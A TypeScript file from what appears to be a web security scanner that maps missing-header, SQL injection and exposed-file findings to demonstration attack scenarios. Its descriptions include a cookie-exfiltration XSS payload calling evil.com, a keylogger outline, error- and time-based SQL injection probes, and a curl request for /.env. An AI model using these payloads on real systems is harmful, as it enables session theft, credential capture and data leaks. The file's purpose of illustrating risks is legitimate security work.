export interface AttackScenario {
  id: string;
  name: string;
  attackerObjective: string;
  objectiveSeverity: "critical" | "high";
  description: string;
  howItWorks: string;
  simulationType: "clickjacking" | "xss-terminal" | "sqli-terminal" | "sensitive-file-terminal";
}

export const SCENARIO_MAP: Record<string, AttackScenario[]> = {
  "missing-x-frame-options": [
    {
      id: "clickjacking-lottery",
      name: "Fake Lottery Bait",
      attackerObjective: "Credential Theft / Unauthorized Action",
      objectiveSeverity: "critical",
      description:
        "A fake \"You Won!\" prize notification overlays the target site. When the victim clicks \"Claim Prize\" they unknowingly trigger a real authenticated action — payment, account deletion, or data change — on the legitimate page beneath.",
      howItWorks:
        "The target page sits in a transparent iframe aligned so its critical button sits directly under the decoy button. One click triggers the real form submission in the victim's active authenticated session.",
      simulationType: "clickjacking",
    },
    {
      id: "clickjacking-video",
      name: "Fake Video Play Button",
      attackerObjective: "One-Click Form Submission / CSRF",
      objectiveSeverity: "high",
      description:
        "A professional-looking video player thumbnail covers the target page. The play button is pixel-aligned over a critical \"Submit\", \"Transfer\", or \"Confirm\" button on the underlying real site.",
      howItWorks:
        "Victim sees a compelling video preview. One click on the ▶ play button actually clicks the real form submit underneath, performing an irreversible action in their authenticated session without any visible feedback.",
      simulationType: "clickjacking",
    },
  ],

  "missing-csp": [
    {
      id: "xss-session-theft",
      name: "Session Cookie Exfiltration",
      attackerObjective: "Authentication Token Theft",
      objectiveSeverity: "critical",
      description:
        "Without Content-Security-Policy, any injected <script> tag executes freely in the page's origin. Uses a real Puppeteer browser to read live cookies and localStorage from the target URL — showing actual tokens if unprotected.",
      howItWorks:
        "Payload: <script>fetch('//evil.com?c='+btoa(document.cookie))</script>. With no script-src policy, the browser executes this with full origin privilege — reading every cookie and storage token scoped to that domain.",
      simulationType: "xss-terminal",
    },
    {
      id: "xss-keylogger",
      name: "Keylogger Injection",
      attackerObjective: "Real-Time Credential Capture",
      objectiveSeverity: "critical",
      description:
        "An injected keylogger hooks the keyboard event listener and silently forwards every keystroke to the attacker. Type into the victim login form — the terminal streams your exact keystrokes in real time alongside live browser storage data.",
      howItWorks:
        "Payload injects document.addEventListener('keydown', fn). Each character is buffered and POSTed to an attacker-controlled API. Captures passwords even before form submission.",
      simulationType: "xss-terminal",
    },
  ],

  // ── SQL Injection ────────────────────────────────────────────────────────────
  // Matched by prefix: any finding ID starting with "sqli-" (except no-params / not-detected)
  "sqli": [
    {
      id: "sqli-live-extraction",
      name: "Live DB Metadata Extraction",
      attackerObjective: "Database Enumeration / Data Exfiltration",
      objectiveSeverity: "critical",
      description:
        "Enter any URL with a query parameter and the engine fires real error-based and time-based SQL injection probes. If vulnerable, it runs EXTRACTVALUE() payloads to extract the live database version, current user, and database name from the server response.",
      howItWorks:
        "Error-based: inject a quote to trigger a MySQL syntax error. Time-based: inject SLEEP(4) to confirm blind SQLi. EXTRACTVALUE(1, concat(0x7e, @@version)) leaks data in the XPath error message.",
      simulationType: "sqli-terminal",
    },
  ],

  // ── Sensitive File Exposure ──────────────────────────────────────────────────
  // Matched by prefix: any finding ID starting with "sensitive-" (except sensitive-files-none)
  "sensitive-file": [
    {
      id: "sensitive-file-live-read",
      name: "Live File Content Reader",
      attackerObjective: "Secret / Credential Exfiltration",
      objectiveSeverity: "critical",
      description:
        "Select any common sensitive path (/.env, /.git/HEAD, /wp-config.php…) or enter a custom path. The engine sends a real HTTP GET to the target URL and reads the first 10 lines of any accessible file, redacting secret values for display.",
      howItWorks:
        "Attacker issues a direct GET request: curl https://target.com/.env — if the web server doesn't block access to dotfiles, the entire file is returned in the response body with all environment variables, API keys, and credentials visible.",
      simulationType: "sensitive-file-terminal",
    },
  ],
};
